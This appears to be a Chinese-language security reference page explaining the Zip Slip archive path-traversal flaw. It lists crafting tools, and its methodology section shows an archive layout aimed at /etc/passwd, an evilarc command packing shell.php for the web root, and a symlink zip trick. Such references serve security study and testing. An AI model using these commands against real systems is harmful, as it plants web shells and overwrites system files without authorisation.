[原文文档](README.en.md)

# Zip Slip

> 该漏洞利用包含目录遍历文件名（例如../../shell.php）的特殊构造归档文件进行利用。Zip Slip漏洞可能影响众多归档格式，包括tar、jar、war、cpio、apk、rar和7z。然后攻击者可以覆盖可执行文件并远程调用它们或等待系统或用户调用它们，从而在受害者机器上实现远程命令执行。

## 摘要

* [工具](#工具)
* [方法论](#方法论)
* [参考资料](#参考资料)

## 工具

* [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc) - 创建可利用目录遍历漏洞的tar/zip归档文件
* [usdAG/slipit](https://github.com/usdAG/slipit) - 用于创建ZipSlip归档文件的实用程序

## 方法论

Zip Slip漏洞是一个影响归档文件处理的关键安全缺陷，如ZIP、TAR或其他压缩文件格式。此漏洞允许攻击者在预期提取目录之外写入任意文件，可能覆盖关键系统文件、执行恶意代码或获得对敏感信息的未授权访问。

**示例**：假设攻击者创建具有以下结构的ZIP文件：

```ps1
malicious.zip
  ├── ../../../../etc/passwd
  ├── ../../../../usr/local/bin/malicious_script.sh
```

当易受攻击的应用程序提取`malicious.zip`时，文件被写入`/etc/passwd`和`/usr/local/bin/malicious_script.sh`，而不是包含在提取目录内。这可能产生严重后果，例如破坏系统文件或执行恶意脚本。

* 使用[ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)：

    ```python
    python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
    ```

* 创建包含符号链接的ZIP归档文件：

    ```ps1
    ln -s ../../../index.php symindex.txt
    zip --symlinks test.zip symindex.txt
    ```

有关受影响的库和项目列表，请访问[snyk/zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability)

## 参考资料

* [Zip Slip - Snyk - 2018年6月5日](https://github.com/snyk/zip-slip-vulnerability)
* [Zip Slip漏洞 - Snyk - 2018年4月15日](https://snyk.io/research/zip-slip-vulnerability)